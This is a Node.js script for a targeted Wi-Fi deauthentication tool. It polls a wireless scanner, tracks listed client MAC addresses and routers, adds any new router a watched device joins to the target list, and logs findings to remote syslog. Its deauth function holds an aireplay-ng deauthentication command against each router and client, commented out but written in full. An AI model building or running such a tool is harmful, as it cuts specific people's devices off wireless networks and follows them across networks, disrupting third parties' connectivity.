const os = require('os');
const yaml = require('yamljs');
const proc = require('child_process');
const request = require('request');
const schedule = require('node-schedule');

const conf = yaml.load('conf.yaml');
const INTERFACE = conf.interface || 'wlan0mon';

const watch_list = {
    infrastructure: conf.target.infrastructure || [],
    client: conf.target.client || []
};

let rsyslog = null;
if(conf.rsyslog.enabled === true){
    const {RemoteSyslog, FACILITY, SEVERITY} = require('rsyslog');
    rsyslog = new RemoteSyslog({
        target_host: conf.rsyslog.host,
        target_port: conf.rsyslog.port,
        hostname: os.hostname(),
        facility: FACILITY.local0,
        appname: conf.rsyslog.appname,
        procid: process.pid.toString()
    });
}


let rule = new schedule.RecurrenceRule();
rule.second = [0, 10, 20, 30, 40, 50];
let handler = schedule.scheduleJob(rule, kill);

function kill(){
    request.get(conf.scanner, function(error, response, body){
        if(error){
            console.log(error);
            return;
        }
        const res = JSON.parse(body);
        const wifi = res['detection-run']['wireless-network'];
        wifi.forEach(infra => {
            if(watch_list.infrastructure.indexOf(infra.BSSID) > -1){
                // ap avaliable
                const clients = obj2Arr(infra['wireless-client']);
                clients.forEach(cli => {
                    if(!isWatchingClient(cli)){
                        watch_list.client.push(cli);
                        sendLog(`device found, MAC=[${cli['client-mac']}], MANUF=[${cli['client-manuf']}]`);
                    }
                    deauth(infra, cli);
                });
            }else{
                const clients = obj2Arr(infra['wireless-client']);
                clients.forEach(cli => {
                    if(isWatchingClient(cli)){
                        watch_list.infrastructure.push(infra.BSSID);
                        sendLog(`new router found, device ${cli['client-manuf']}(${cli['client-mac']}) is connected to ${infra.SSID.essid['$t']}(${infra.BSSID}, ${infra.manuf})`);
                        deauth(infra, cli);
                    }
                });
            }
        });
    })
}

function isWatchingClient(client){
    for(let i=0; i<watch_list.client.length; i++){
        if(watch_list.client[i]['client-mac'] == client['client-mac']){
            return true;
        }
    }
    return false;
}

function isWatchingInfra(infrastructure){
    for(let i=0; i<watch_list.infrastructure.length; i++){
        if(watch_list.infrastructure[i]['BSSID'] == infrastructure['BSSID']){
            return true;
        }
    }
    return false;
}

function sendLog(msg){
    rsyslog && rsyslog.send(SEVERITY.NOTICE, msg, {
        timestamp: Date.now(),
    });
    !rsyslog && console.log(msg);
}

function deauth(infrastructure, client){
    console.log(`deauth [${client['client-mac']}] from [${infrastructure.BSSID}] ...`)
    // proc.spawn('sudo', 
    //     [
    //         'aireplay-ng', 
    //         '-02',
    //         '-a', infrastructure.BSSID, 
    //         '-c', client['client-mac'],
    //         INTERFACE
    //     ]
    // )
}

function obj2Arr(obj){
    if(obj == null){
        return [];
    }
    return Object.prototype.toString.call(obj) === "[object Array]" ? obj : [obj];
}

module.exports = {
    start: function(){
        if(!handler){
            handler = schedule.scheduleJob(rule, kill);
        }
        return handler;
    },
    stop: function(){
        if(handler){
            handler.cancel();
            handler = null;
        }
        return handler;
    },
    stat: function(){
        return handler;
    }
}